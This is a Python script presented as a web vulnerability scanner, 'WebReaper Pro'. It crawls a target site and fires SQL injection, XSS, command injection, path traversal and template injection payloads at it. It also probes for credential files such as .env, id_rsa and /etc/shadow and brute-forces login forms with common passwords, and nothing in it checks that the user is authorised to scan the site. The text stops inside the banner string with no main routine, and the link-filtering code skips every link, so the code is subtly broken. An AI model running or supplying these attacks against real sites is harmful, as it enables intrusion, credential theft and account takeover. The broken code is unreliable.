#!/usr/bin/env python3
"""
WebReaper Pro v4.0 — Multi-vector Web Vulnerability Scanner
Uses: requests, beautifulsoup4, urllib3
pip install requests beautifulsoup4
Usage: python webreaper.py <url> [--deep] [--brute] [--report] [--threads N]
"""

import sys
import re
import time
import threading
import json
import argparse
from datetime import datetime
from collections import deque
from urllib.parse import urlparse, urljoin, urlencode, urldefrag, parse_qsl, urlunparse

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Missing deps. Run: pip install requests beautifulsoup4")
    sys.exit(1)

# ── args ──────────────────────────────────────────
ap = argparse.ArgumentParser(description="WebReaper Pro v4.0")
ap.add_argument("url",               help="Target URL")
ap.add_argument("--deep",   action="store_true", help="Deep crawl (more URLs)")
ap.add_argument("--brute",  action="store_true", help="Login brute force")
ap.add_argument("--report", action="store_true", help="Save JSON report")
ap.add_argument("--threads",type=int, default=15, help="Thread count (default 15)")
ap.add_argument("--proxy",  default=None,         help="Proxy (e.g. http://127.0.0.1:8080)")
args = ap.parse_args()

TARGET   = args.url.rstrip("/")
DEEP     = args.deep
BRUTE    = args.brute
REPORT   = args.report
THREADS  = args.threads
PROXY    = {"http": args.proxy, "https": args.proxy} if args.proxy else None
MAX_URLS = 600 if DEEP else 150
DEPTH    = 5   if DEEP else 3
TIMEOUT  = 12

parsed_target = urlparse(TARGET)
ORIGIN = f"{parsed_target.scheme}://{parsed_target.netloc}"

# ── session ───────────────────────────────────────
SESSION = requests.Session()
SESSION.verify  = False
SESSION.proxies = PROXY
SESSION.headers.update({
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection":      "keep-alive",
})

# ── colours ───────────────────────────────────────
R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
M="\033[95m"; C="\033[96m"; W="\033[97m"; RS="\033[0m"; BD="\033[1m"

# ── state ─────────────────────────────────────────
RESULTS    = []
REPORTED   = set()
VULN_COUNT = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
LOCK       = threading.Lock()

# ══════════════════════════════════════════════════
# PAYLOADS
# ══════════════════════════════════════════════════

SQLI_ERROR_PAYLOADS = [
    "'", "''", "`", "\"",
    "' OR '1'='1'--",  "' OR 1=1--",
    "\" OR \"1\"=\"1\"--", "') OR ('1'='1'--",
    "1' ORDER BY 1--",  "1' ORDER BY 99--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "admin'--", "1 AND 1=1", "1 AND 1=2",
    "' AND 1=1--", "' AND 1=2--",
    "1'; SELECT SLEEP(0)--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(4)--",                   4),
    ("1' AND SLEEP(4)--",                  4),
    ("'; WAITFOR DELAY '0:0:4'--",         4),
    ("1; WAITFOR DELAY '0:0:4'--",         4),
    ("' AND (SELECT * FROM (SELECT(SLEEP(4)))x)--", 4),
    ("\" AND SLEEP(4)--",                  4),
    ("') AND SLEEP(4)--",                  4),
    ("1 AND SLEEP(4)--",                   4),
    ("1 OR SLEEP(4)--",                    4),
]

SQLI_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning.*?mysql_",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ora-\d{4,5}",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"odbc microsoft access driver",
    r"postgresql.*?error",
    r"sqlite3?\.",
    r"syntax error.*?near",
    r"invalid query",
    r"supplied argument is not a valid mysql",
    r"pg_query\(\).*?failed",
    r"mysql_fetch_array\(\)",
    r"column count doesn't match",
    r"unknown column",
    r"table.*?doesn't exist",
    r"com\.mysql\.jdbc",
    r"org\.postgresql",
    r"jdbc\.",
    r"sql command not properly ended",
    r"mysql_num_rows\(\)",
    r"warning.*?mssql_",
    r"division by zero in",
    r"invalid use of null",
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '\'"><script>alert(1)</script>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '\';alert(1)//',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<math><mtext></p><img src=x onerror=alert(1)>',
    '<<script>alert(1)//<</script>',
    '<ScRiPt>alert(1)</sCrIpT>',
    'javascript:alert(1)',
    '"><svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '"-alert(1)-"',
    '\'-alert(1)-\'',
]

CMDI_PAYLOADS = [
    ("; id",         ["uid=", "root", "www-data"]),
    ("| id",         ["uid=", "root", "www-data"]),
    ("$(id)",        ["uid=", "root"]),
    ("`id`",         ["uid=", "root"]),
    ("; whoami",     ["root", "www-data", "apache", "nginx"]),
    ("| whoami",     ["root", "www-data", "apache", "nginx"]),
    ("; cat /etc/passwd", ["root:x:0:0", "daemon:", "nobody:"]),
    ("| cat /etc/passwd", ["root:x:0:0", "daemon:", "nobody:"]),
    ("\nid\n",       ["uid=", "root"]),
    ("& id &",       ["uid=", "root"]),
    ("|| id",        ["uid=", "root"]),
    ("&& id",        ["uid=", "root"]),
]

CMDI_TIME = [
    ("; sleep 4",   4),
    ("| sleep 4",   4),
    ("; ping -c 4 127.0.0.1", 3),
]

LFI_PAYLOADS = [
    ("../etc/passwd",                   ["root:x:0:0", "daemon:", "/bin/"]),
    ("../../etc/passwd",                ["root:x:0:0", "daemon:", "/bin/"]),
    ("../../../etc/passwd",             ["root:x:0:0", "daemon:", "/bin/"]),
    ("../../../../etc/passwd",          ["root:x:0:0", "daemon:", "/bin/"]),
    ("../../../../../etc/passwd",       ["root:x:0:0", "daemon:", "/bin/"]),
    ("../../../../../../etc/passwd",    ["root:x:0:0", "daemon:", "/bin/"]),
    ("....//....//etc/passwd",          ["root:x:0:0"]),
    ("%2e%2e%2fetc%2fpasswd",           ["root:x:0:0"]),
    ("..%2Fetc%2Fpasswd",              ["root:x:0:0"]),
    ("..%252Fetc%252Fpasswd",          ["root:x:0:0"]),
    ("/etc/passwd",                     ["root:x:0:0"]),
    ("../../windows/win.ini",           ["[fonts]", "[extensions]", "for 16-bit"]),
    ("../../../windows/win.ini",        ["[fonts]", "[extensions]"]),
    ("../../../../windows/win.ini",     ["[fonts]", "[extensions]"]),
    ("php://filter/convert.base64-encode/resource=index.php", ["PD9waHA"]),
    ("php://filter/read=convert.base64-encode/resource=../config.php", ["PD9waHA"]),
]

SSTI_PAYLOADS = [
    ("{{7*7}}",   "49"),
    ("${7*7}",    "49"),
    ("#{7*7}",    "49"),
    ("*{7*7}",    "49"),
    ("@{7*7}",    "49"),
    ("{{7*'7'}}", "7777777"),
    ("<%= 7*7 %>","49"),
]

REDIRECT_PARAMS = {
    "redirect","url","next","return","goto","target","link","dest",
    "destination","redir","redirect_uri","redirect_url","continue",
    "forward","location","back","ref","returnurl","returnto",
    "return_url","return_to","callback","success_url","to","out",
}

SENSITIVE_FILES = [
    "/.env","/.env.local","/.env.production","/.env.development",
    "/.env.staging","/.env.backup","/.env.bak","/.env.old","/.env.example",
    "/.git/config","/.git/HEAD","/.git/FETCH_HEAD","/.git/index",
    "/.git/logs/HEAD","/.gitignore","/.svn/entries","/.svn/wc.db",
    "/config.php","/config.php.bak","/config.php.old","/config.inc.php",
    "/configuration.php","/settings.php","/database.php","/db.php",
    "/wp-config.php","/wp-config.php.bak","/wp-config.php.old",
    "/wp-config-sample.php","/wp-login.php",
    "/database.sql","/dump.sql","/backup.sql","/db.sql",
    "/data.sql","/mysql.sql","/site.sql","/.sql",
    "/admin/","/admin/login","/admin/login.php","/administrator/",
    "/administrator/index.php","/phpmyadmin/","/phpMyAdmin/","/pma/",
    "/mysql/","/panel/","/cpanel/","/wp-admin/","/backend/","/manage/",
    "/.htaccess","/.htpasswd","/.bash_history","/.bash_profile",
    "/.bashrc","/.ssh/id_rsa","/.ssh/authorized_keys","/.ssh/known_hosts",
    "/server-status","/server-info","/nginx_status","/stub_status",
    "/robots.txt","/sitemap.xml","/crossdomain.xml","/clientaccesspolicy.xml",
    "/api/","/api/v1/","/api/v2/","/api/v3/","/api/v4/",
    "/swagger.json","/swagger-ui.html","/openapi.json","/api-docs",
    "/actuator","/actuator/env","/actuator/mappings","/actuator/beans",
    "/actuator/health","/actuator/info","/actuator/metrics","/actuator/dump",
    "/debug","/debug.php","/test","/test.php","/dev/",
    "/backup/","/old/","/temp/","/tmp/","/logs/","/log/",
    "/error_log","/access_log","/error.log","/access.log","/debug.log",
    "/info.php","/phpinfo.php","/php.php","/test.php",
    "/.DS_Store","/Thumbs.db","/desktop.ini",
    "/package.json","/package-lock.json","/composer.json",
    "/composer.lock","/yarn.lock","/Gemfile","/requirements.txt",
    "/web.config","/applicationHost.config","/app.config",
    "/readme.txt","/README.md","/CHANGELOG.md","/INSTALL.txt",
    "/Dockerfile","/docker-compose.yml","/.dockerenv",
    "/proc/self/environ","/etc/passwd","/etc/shadow",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS missing — HTTPS not enforced",
    "Content-Security-Policy":   "CSP missing — XSS protection absent",
    "X-Frame-Options":           "Clickjacking protection missing",
    "X-Content-Type-Options":    "MIME sniffing protection missing",
    "X-XSS-Protection":          "Legacy XSS filter not set",
    "Referrer-Policy":           "Referrer policy not set",
    "Permissions-Policy":        "Permissions policy not set",
}

BRUTE_USERS = ["admin","administrator","root","user","test","guest","manager","superuser","demo","operator"]
BRUTE_PASSWORDS = [
    "admin","password","123456","admin123","root","toor","pass","test","guest",
    "qwerty","abc123","letmein","monkey","dragon","1234567890","password1",
    "administrator","login","welcome","hello","master","1234","666666",
    "12345678","sunshine","princess","iloveyou","password123","admin1234",
    "changeme","secret","pass123","testing","default","alpine","oracle",
    "admin@123","P@ssw0rd","Admin123","P@$$w0rd","passw0rd","Summer2023",
    "Winter2023","Spring2023","Autumn2023","Company123","Company@123",
]

# ══════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════

def log(level, msg, detail=""):
    key = f"{level}:{msg[:80]}"
    with LOCK:
        if key in REPORTED:
            return
        REPORTED.add(key)
        if level in VULN_COUNT:
            VULN_COUNT[level] += 1

    ts    = datetime.now().strftime("%H:%M:%S")
    icons = {
        "CRITICAL": f"{R}{BD}[CRITICAL]{RS}",
        "HIGH":     f"{R}[HIGH]{RS}",
        "MEDIUM":   f"{Y}[MEDIUM]{RS}",
        "LOW":      f"{B}[LOW]{RS}",
        "INFO":     f"{C}[INFO]{RS}",
        "SAFE":     f"{G}[SAFE]{RS}",
        "SCAN":     f"{M}[SCAN]{RS}",
    }
    icon = icons.get(level, f"[{level}]")
    line = f"{W}{ts}{RS} {icon} {msg}"
    if detail:
        line += f"\n         {Y}↳ {detail}{RS}"
    print(line, flush=True)
    with LOCK:
        RESULTS.append({"level": level, "msg": msg, "detail": detail, "ts": ts})

def progress(msg):
    print(f"\r{M}[~]{RS} {msg:<90}", end="", flush=True)

# ══════════════════════════════════════════════════
# HTTP HELPERS
# ══════════════════════════════════════════════════

def get(url, **kw):
    try:
        r = SESSION.get(url, timeout=TIMEOUT, allow_redirects=True, **kw)
        return r
    except Exception:
        return None

def post(url, data, **kw):
    try:
        r = SESSION.post(url, data=data, timeout=TIMEOUT, allow_redirects=True, **kw)
        return r
    except Exception:
        return None

def get_params(url):
    return dict(parse_qsl(urlparse(url).query))

def inject_url(url, param, value):
    p = urlparse(url)
    params = dict(parse_qsl(p.query))
    params[param] = value
    return urlunparse(p._replace(query=urlencode(params)))

def same_domain(url):
    return urlparse(url).netloc == urlparse(ORIGIN).netloc

# ══════════════════════════════════════════════════
# CRAWLER — BFS level-by-level with bs4
# ══════════════════════════════════════════════════

def crawl_site():
    # *bs4 lit le HTML comme un dictionnaire, chaque lien est une clé*
    visited   = set()
    all_urls  = []
    all_forms = []
    frontier  = [TARGET]
    lock      = threading.Lock()

    for depth in range(DEPTH + 1):
        if not frontier or len(all_urls) >= MAX_URLS:
            break

        next_frontier = []
        nf_lock       = threading.Lock()
        sem           = threading.Semaphore(THREADS)
        threads       = []

        def fetch_page(url):
            try:
                norm = urldefrag(url)[0]
                with lock:
                    if norm in visited or len(all_urls) >= MAX_URLS:
                        return
                    visited.add(norm)

                r = get(url)
                if r is None or r.status_code in (404, 403, 410):
                    return
                if "text/html" not in r.headers.get("content-type", ""):
                    return

                with lock:
                    all_urls.append(url)
                    progress(f"Crawling d={depth} [{len(all_urls)}/{MAX_URLS}] {url[:70]}")

                soup = BeautifulSoup(r.text, "html.parser")

                # collect forms
                for form_tag in soup.find_all("form"):
                    action = form_tag.get("action", "")
                    action = urljoin(url, action) if action else url
                    method = form_tag.get("method", "GET").upper()
                    inputs = []
                    for inp in form_tag.find_all(["input","textarea","select"]):
                        name  = inp.get("name","")
                        itype = inp.get("type","text").lower()
                        value = inp.get("value","")
                        if name:
                            if not value:
                                value = ("test@test.com" if itype=="email" else
                                         "test123"       if itype=="password" else
                                         "1"             if itype=="number" else
                                         "test")
                            inputs.append({"name":name,"type":itype,"value":value})
                    if inputs:
                        with lock:
                            all_forms.append({"action":action,"method":method,"inputs":inputs})

                # collect links
                new_links = []
                for a in soup.find_all("a", href=True):
                    href = a["href"].strip()
                    if href.startswith(("javascript:","mailto:","tel:","#","")):
                        continue
                    full = urljoin(url, href)
                    full = urldefrag(full)[0]
                    if same_domain(full):
                        new_links.append(full)

                with nf_lock:
                    next_frontier.extend(new_links)

            except Exception:
                pass
            finally:
                sem.release()

        for url in frontier:
            sem.acquire()
            t = threading.Thread(target=fetch_page, args=(url,), daemon=True)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        # dedup next frontier
        seen  = set()
        dedup = []
        for u in next_frontier:
            n = urldefrag(u)[0]
            if n not in seen and n not in visited:
                seen.add(n)
                dedup.append(u)
        frontier = dedup

    print()

    # dedup forms
    seen_forms, unique_forms = set(), []
    for f in all_forms:
        key = (f["action"], f["method"], tuple(i["name"] for i in f["inputs"]))
        if key not in seen_forms:
            seen_forms.add(key)
            unique_forms.append(f)

    return all_urls, unique_forms

# ══════════════════════════════════════════════════
# MODULE — SQL INJECTION
# ══════════════════════════════════════════════════

def sqli_url(url):
    params = get_params(url)
    if not params:
        return
    path = urlparse(url).path

    for param, orig in params.items():
        # error-based
        for payload in SQLI_ERROR_PAYLOADS:
            r = get(inject_url(url, param, orig + payload))
            if r is None:
                continue
            for err in SQLI_ERRORS:
                if re.search(err, r.text, re.I):
                    log("CRITICAL", f"SQLi Error-based → {path}?{param}",
                        f"payload={payload!r} | matched: {err}")
                    return

        # boolean-based blind
        r_orig  = get(url)
        r_true  = get(inject_url(url, param, orig + "' AND '1'='1"))
        r_false = get(inject_url(url, param, orig + "' AND '1'='2"))
        if r_orig and r_true and r_false:
            lt, lf = len(r_true.text), len(r_false.text)
            lo = len(r_orig.text)
            if abs(lt - lo) < 30 and abs(lt - lf) > 50:
                log("CRITICAL", f"SQLi Boolean Blind → {path}?{param}",
                    f"true_len={lt} false_len={lf} diff={abs(lt-lf)}")
                return

        # time-based
        for payload, threshold in SQLI_TIME_PAYLOADS:
            t0 = time.time()
            get(inject_url(url, param, orig + payload))
            elapsed = time.time() - t0
            if elapsed >= threshold - 0.5:
                log("CRITICAL", f"SQLi Time-based Blind → {path}?{param}",
                    f"payload={payload!r} | delay={elapsed:.1f}s")
                return

def sqli_form(form):
    editable = [i for i in form["inputs"]
                if i["type"] not in ("hidden","submit","button","image","reset","checkbox","radio")]
    if not editable:
        return

    for payload in SQLI_ERROR_PAYLOADS[:14]:
        data = {i["name"]: i["value"] for i in form["inputs"]}
        for inp in editable:
            data[inp["name"]] = inp["value"] + payload

        r = (post(form["action"], data) if form["method"]=="POST"
             else get(form["action"], params=data))
        if r is None:
            continue
        for err in SQLI_ERRORS:
            if re.search(err, r.text, re.I):
                log("CRITICAL", f"SQLi Form → {form['action']}",
                    f"method={form['method']} payload={payload!r} | {err}")
                return

    # time-based form
    for payload, threshold in SQLI_TIME_PAYLOADS[:4]:
        data = {i["name"]: i["value"] for i in form["inputs"]}
        for inp in editable:
            data[inp["name"]] = inp["value"] + payload
        t0 = time.time()
        (post(form["action"], data) if form["method"]=="POST"
         else get(form["action"], params=data))
        if time.time() - t0 >= threshold - 0.5:
            log("CRITICAL", f"SQLi Time-based Form → {form['action']}",
                f"delay={time.time()-t0:.1f}s payload={payload!r}")
            return

# ══════════════════════════════════════════════════
# MODULE — XSS
# ══════════════════════════════════════════════════

def xss_url(url):
    params = get_params(url)
    if not params:
        return
    path = urlparse(url).path

    for param in params:
        for payload in XSS_PAYLOADS:
            r = get(inject_url(url, param, payload))
            if r is None:
                continue
            if payload.lower() in r.text.lower():
                log("HIGH", f"XSS Reflected → {path}?{param}",
                    f"payload={payload!r}")
                return
            # partial: tag fragments reflected
            frags = re.findall(r'(<[a-z]+|onerror|onload|alert\()', payload)
            if frags and all(f.lower() in r.text.lower() for f in frags):
                log("MEDIUM", f"XSS Partial Reflection → {path}?{param}",
                    f"payload={payload!r}")
                return

def xss_form(form):
    editable = [i for i in form["inputs"]
                if i["type"] not in ("hidden","submit","button","image","reset")]
    if not editable:
        return

    for payload in XSS_PAYLOADS[:10]:
        data = {i["name"]: i["value"] for i in form["inputs"]}
        for inp in editable:
            data[inp["name"]] = payload

        r = (post(form["action"], data) if form["method"]=="POST"
             else get(form["action"], params=data))
        if r and payload.lower() in r.text.lower():
            log("HIGH", f"XSS Reflected Form → {form['action']}",
                f"method={form['method']} payload={payload!r}")
            return

# ══════════════════════════════════════════════════
# MODULE — COMMAND INJECTION
# ══════════════════════════════════════════════════

def cmdi_url(url):
    params = get_params(url)
    if not params:
        return
    path = urlparse(url).path

    for param, orig in params.items():
        for payload, indicators in CMDI_PAYLOADS:
            r = get(inject_url(url, param, orig + payload))
            if r is None:
                continue
            for ind in indicators:
                if ind in r.text:
                    log("CRITICAL", f"Command Injection → {path}?{param}",
                        f"payload={payload!r} | indicator={ind!r}")
                    return

        for payload, threshold in CMDI_TIME:
            t0 = time.time()
            get(inject_url(url, param, params[param] + payload))
            if time.time() - t0 >= threshold:
                log("CRITICAL", f"CMDi Time-based → {path}?{param}",
                    f"payload={payload!r} | delay={time.time()-t0:.1f}s")
                return

# ══════════════════════════════════════════════════
# MODULE — LFI
# ══════════════════════════════════════════════════

def lfi_url(url):
    params = get_params(url)
    if not params:
        return
    path = urlparse(url).path

    FILE_PARAMS = {"file","page","path","include","load","template","view",
                   "doc","dir","folder","cat","module","show","content",
                   "section","lang","locale","read","open","name","filename",
                   "pg","p","q"}
    targets = [p for p in params if p.lower() in FILE_PARAMS] or list(params.keys())

    for param in targets:
        for payload, indicators in LFI_PAYLOADS:
            r = get(inject_url(url, param, payload))
            if r is None:
                continue
            for ind in indicators:
                if ind in r.text:
                    log("CRITICAL", f"LFI Path Traversal → {path}?{param}",
                        f"payload={payload!r} | found: {ind!r}")
                    return

# ══════════════════════════════════════════════════
# MODULE — SSTI
# ══════════════════════════════════════════════════

def ssti_url(url):
    params = get_params(url)
    if not params:
        return
    path = urlparse(url).path

    for param in params:
        for payload, expected in SSTI_PAYLOADS:
            r = get(inject_url(url, param, payload))
            if r and expected in r.text and payload not in r.text:
                log("CRITICAL", f"SSTI → {path}?{param}",
                    f"payload={payload!r} | response contains '{expected}' (RCE possible)")
                return
            elif r and payload in r.text:
                log("MEDIUM", f"SSTI Potential (payload reflected) → {path}?{param}",
                    f"payload={payload!r}")

# ══════════════════════════════════════════════════
# MODULE — OPEN REDIRECT
# ══════════════════════════════════════════════════

def open_redirect_url(url):
    params = get_params(url)
    rparams = [p for p in params if p.lower() in REDIRECT_PARAMS]
    if not rparams:
        return
    path = urlparse(url).path

    evil = "https://evil.example-canary-pwned.com"
    for param in rparams:
        for val in [evil, f"//{evil[8:]}", f"/{evil}", f"@{evil[8:]}"]:
            try:
                r = SESSION.get(inject_url(url, param, val),
                                timeout=TIMEOUT, allow_redirects=False, verify=False)
                loc = r.headers.get("location","")
                if "canary-pwned" in loc:
                    log("HIGH", f"Open Redirect → {path}?{param}",
                        f"redirects to: {loc}")
                    return
            except Exception:
                pass

# ══════════════════════════════════════════════════
# MODULE — SENSITIVE FILES
# ══════════════════════════════════════════════════

def check_sensitive_files():
    queue = deque(SENSITIVE_FILES)
    lock  = threading.Lock()

    def worker():
        while True:
            with lock:
                if not queue:
                    return
                path = queue.popleft()
            url = ORIGIN + path
            try:
                r = SESSION.get(url, timeout=6, allow_redirects=False, verify=False)
                if r.status_code == 200 and len(r.text) > 10:
                    sev = ("CRITICAL" if any(x in path for x in
                           (".env","id_rsa","shadow","wp-config",".htpasswd",
                            ".git/config","database.sql","dump.sql")) else
                           "HIGH" if any(x in path for x in
                           ("admin","phpmyadmin","phpinfo","swagger","actuator",
                            "openapi","backup","debug","proc/self")) else "MEDIUM")
                    log(sev, f"Sensitive File → {path}",
                        f"HTTP {r.status_code} | {len(r.text)} bytes")
            except Exception:
                pass

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(THREADS)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()

# ══════════════════════════════════════════════════
# MODULE — SECURITY HEADERS + FINGERPRINT
# ══════════════════════════════════════════════════

def check_headers():
    r = get(TARGET)
    if not r:
        return
    hdrs = {k.lower(): v for k, v in r.headers.items()}

    for header, reason in SECURITY_HEADERS.items():
        if header.lower() not in hdrs:
            log("LOW", f"Missing Header → {header}", reason)

    if "server" in hdrs:
        log("INFO", f"Server Fingerprint → {hdrs['server']}", "version disclosure risk")
    if "x-powered-by" in hdrs:
        log("MEDIUM", f"Tech Disclosed → X-Powered-By: {hdrs['x-powered-by']}",
            "reveals backend stack")
    if "x-aspnet-version" in hdrs:
        log("MEDIUM", f"ASP.NET Version → {hdrs['x-aspnet-version']}")

    for name, val in r.headers.items():
        if name.lower() == "set-cookie":
            flags = val.lower()
            if "httponly" not in flags:
                log("MEDIUM", "Cookie missing HttpOnly", val[:70])
            if "secure" not in flags:
                log("LOW",    "Cookie missing Secure flag", val[:70])
            if "samesite" not in flags:
                log("LOW",    "Cookie missing SameSite", val[:70])

# ══════════════════════════════════════════════════
# MODULE — CORS
# ══════════════════════════════════════════════════

def check_cors():
    evil = "https://evil-attacker.pwned.com"
    r = get(TARGET, headers={"Origin": evil})
    if not r:
        return
    acao = r.headers.get("Access-Control-Allow-Origin","")
    acac = r.headers.get("Access-Control-Allow-Credentials","")
    if acao == "*":
        log("MEDIUM","CORS Wildcard → Access-Control-Allow-Origin: *",
            "unauthenticated cross-origin reads allowed")
    elif acao == evil:
        sev = "CRITICAL" if acac.lower()=="true" else "HIGH"
        log(sev, f"CORS Misconfiguration → evil origin reflected",
            f"ACAO={acao} | Credentials={acac}")

# ══════════════════════════════════════════════════
# MODULE — INFO LEAK
# ══════════════════════════════════════════════════

def check_info_leak(url):
    r = get(url)
    if not r:
        return
    body = r.text

    patterns = {
        "Stack Trace Java":   (r"at\s+[\w\.$]+\([\w]+\.java:\d+\)", "HIGH"),
        "Stack Trace .NET":   (r"at\s+[\w\.\s]+\(\) in \w", "HIGH"),
        "PHP Error":          (r"(Parse error|Fatal error|Warning|Notice).*?on line \d+", "HIGH"),
        "Python Traceback":   (r"Traceback \(most recent call last\)", "HIGH"),
        "Debug Dump":         (r"(var_dump|print_r|debug_backtrace|dd\()\s*\(", "MEDIUM"),
        "SQL Query Exposed":  (r"(SELECT\s+[\w\*,\s]+FROM|INSERT\s+INTO|UPDATE\s+\w+\s+SET)", "HIGH"),
        "AWS Access Key":     (r"AKIA[0-9A-Z]{16}", "CRITICAL"),
        "AWS Secret":         (r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}", "CRITICAL"),
        "Private Key":        (r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----", "CRITICAL"),
        "JWT Token":          (r"eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]+", "HIGH"),
        "Password in HTML":   (r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"]?[\w@#$!%]{6,}", "HIGH"),
        "Internal IP":        (r"\b(10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+)\b", "LOW"),
        "Email Addresses":    (r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,6}", "INFO"),
        "Google API Key":     (r"AIza[0-9A-Za-z\-_]{35}", "HIGH"),
        "Stripe Key":         (r"(sk|pk)_(test|live)_[0-9a-zA-Z]{24}", "CRITICAL"),
        "GitHub Token":       (r"ghp_[0-9a-zA-Z]{36}", "CRITICAL"),
    }

    for label, (pat, sev) in patterns.items():
        m = re.search(pat, body)
        if m:
            log(sev, f"Info Leak → {label}", f"match: {m.group(0)[:100]!r}")

# ══════════════════════════════════════════════════
# MODULE — BRUTE FORCE
# ══════════════════════════════════════════════════

def brute_force(forms):
    if not BRUTE:
        log("INFO","Brute force disabled","add --brute to enable")
        return

    login_forms = [f for f in forms if any(i["type"]=="password" for i in f["inputs"])]
    if not login_forms:
        log("INFO","No login forms found")
        return

    for form in login_forms:
        user_inp = next((i for i in form["inputs"] if i["type"] in ("text","email")), None)
        pass_inp = next((i for i in form["inputs"] if i["type"]=="password"), None)
        if not user_inp or not pass_inp:
            continue

        log("SCAN", f"Brute force → {form['action']}")
        r0 = (post(form["action"], {i["name"]:i["value"] for i in form["inputs"]})
              if form["method"]=="POST"
              else get(form["action"], params={i["name"]:i["value"] for i in form["inputs"]}))
        baseline = len(r0.text) if r0 else 0

        FAIL_WORDS = {"invalid","incorrect","wrong","failed","error",
                      "denied","unauthorized","bad credentials","login failed"}

        for user in BRUTE_USERS:
            for pwd in BRUTE_PASSWORDS:
                data = {i["name"]: i["value"] for i in form["inputs"]}
                data[user_inp["name"]] = user
                data[pass_inp["name"]] = pwd

                r = (post(form["action"], data) if form["method"]=="POST"
                     else get(form["action"], params=data))
                if not r:
                    continue

                fail = any(w in r.text.lower() for w in FAIL_WORDS)
                if not fail:
                    size_diff = abs(len(r.text) - baseline)
                    log("CRITICAL" if r.url != form["action"] or size_diff > 200 else "HIGH",
                        f"Login credentials found → {form['action']}",
                        f"user={user!r} pass={pwd!r} | status={r.status_code}")
                    return

# ══════════════════════════════════════════════════
# REPORT
# ══════════════════════════════════════════════════

def print_report(t0, n_urls, n_forms):
    elapsed = time.time() - t0
    print(f"\n{'═'*70}")
    print(f"{BD}{W}   WebReaper Pro v4.0 — SCAN REPORT{RS}")
    print(f"{'═'*70}")
    print(f"  {C}Target   {RS}: {TARGET}")
    print(f"  {C}URLs     {RS}: {n_urls} crawled | {n_forms} forms")
    print(f"  {C}Duration {RS}: {elapsed:.1f}s")
    print(f"  {C}Date     {RS}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'─'*70}")
    print(f"  {R}{BD}CRITICAL {RS}: {VULN_COUNT['CRITICAL']}")
    print(f"  {R}HIGH     {RS}: {VULN_COUNT['HIGH']}")
    print(f"  {Y}MEDIUM   {RS}: {VULN_COUNT['MEDIUM']}")
    print(f"  {B}LOW      {RS}: {VULN_COUNT['LOW']}")
    print(f"  {C}INFO     {RS}: {VULN_COUNT['INFO']}")
    print(f"{'─'*70}")
    total = sum(VULN_COUNT.values())
    risk  = ("CRITICAL" if VULN_COUNT["CRITICAL"] else
             "HIGH"     if VULN_COUNT["HIGH"] else
             "MEDIUM"   if VULN_COUNT["MEDIUM"] else "LOW")
    rc    = R if risk in ("CRITICAL","HIGH") else Y if risk=="MEDIUM" else B
    print(f"  Total: {BD}{total}{RS} findings | Risk: {rc}{BD}{risk}{RS}")
    print(f"{'═'*70}\n")

    if REPORT:
        fname = f"webreaper_{urlparse(TARGET).netloc}_{int(time.time())}.json"
        with open(fname, "w") as f:
            json.dump({
                "target":       TARGET,
                "scan_date":    datetime.now().isoformat(),
                "duration_sec": round(elapsed, 2),
                "urls_crawled": n_urls,
                "forms_found":  n_forms,
                "summary":      VULN_COUNT,
                "findings":     RESULTS,
            }, f, indent=2)
        print(f"  {G}Report → {fname}{RS}\n")

# ══════════════════════════════════════════════════
# BANNER
# ══════════════════════════════════════════════════

BANNER = f"""{R}{BD}
 ██╗    ██╗███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
 ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
 ██║ █╗ ██║█████╗  ██████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
 ██║███╗██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
 ╚███╔███╔╝███████╗██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
{RS}{Y}              Pro v4.0 — requests + beautifulsoup4 edition{RS}
